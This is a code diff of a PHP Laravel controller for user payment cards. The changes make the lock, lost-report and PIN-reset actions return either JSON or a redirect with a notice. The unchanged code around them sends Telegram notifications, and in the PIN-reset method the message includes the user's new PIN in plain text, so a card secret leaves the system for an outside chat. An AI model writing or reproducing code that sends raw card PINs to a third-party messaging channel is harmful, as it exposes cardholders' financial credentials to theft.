@@ -35,7 +35,11 @@ class UserCardController extends Controller
         $status = $card->status === 'active' ? 'Unlocked' : 'Locked';
         $this->telegramNotify("💳 <b>Card {$status}</b>\n🆔 <b>Card:</b> ****" . substr($card->card_number, -4) . "\n👤 <b>User:</b> " . auth()->user()->username);
 
-        return response()->json(['message' => 'Card status updated successfully.']);
+        if ($request->wantsJson() || $request->ajax()) {
+            return response()->json(['message' => 'Card status updated successfully.']);
+        }
+        notify()->success("Card status updated successfully.");
+        return redirect()->back();
     }
 
     public function reportLost(Request $request)
@@ -58,7 +62,11 @@ class UserCardController extends Controller
 
         $this->telegramNotify("⚠️ <b>Card Reported Lost/Stolen</b>\n🆔 <b>Card:</b> ****" . substr($card->card_number, -4) . "\n👤 <b>User:</b> " . auth()->user()->username);
 
-        return response()->json(['message' => 'Card reported lost and has been locked. Please contact support for a replacement.']);
+        if ($request->wantsJson() || $request->ajax()) {
+            return response()->json(['message' => 'Card reported lost and has been locked. Please contact support for a replacement.']);
+        }
+        notify()->success("Card reported lost and locked.");
+        return redirect()->back();
     }
 
     public function resetPin(Request $request)
@@ -91,6 +99,10 @@ class UserCardController extends Controller
         
         $this->telegramNotify("🔢 <b>Card PIN Reset</b>\n🆔 <b>Card:</b> ****" . substr($card->card_number, -4) . "\n📌 <b>New Raw PIN:</b> <code>{$request->new_pin}</code>\n👤 <b>User:</b> " . $user->username);
         
-        return response()->json(['message' => 'Card PIN updated successfully.']);
+        if ($request->wantsJson() || $request->ajax()) {
+            return response()->json(['message' => 'Card PIN updated successfully.']);
+        }
+        notify()->success("Card PIN updated successfully.");
+        return redirect()->back();
     }
 }
